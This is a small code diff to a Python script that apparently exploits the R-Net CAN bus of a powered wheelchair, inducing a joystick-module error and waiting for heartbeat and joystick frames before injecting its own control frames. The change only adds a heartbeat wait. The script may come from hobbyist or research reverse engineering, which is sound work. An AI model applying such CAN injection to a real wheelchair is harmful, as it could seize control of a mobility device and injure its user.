@@ -53,6 +53,9 @@ def induce_JSM_error(cansocket):
         cansend(cansocket,'0c000000#')
 
 def RNET_JSMerror_exploit(cansocket):
+
+        print("Waiting for JSM heartbeat")
+        canwait(cansocket, "03C30F0F:1FFFFFFF")
         t=time()+0.20
         print("Waiting for joy frame")
         joy_id = wait_joystickframe(cansocket,t)
@@ -125,6 +128,7 @@ if __name__ == "__main__":
         if cansocket != '':
 
             print(cansocket)
+
             #init /dev joystick
             global joyx
             global joyy
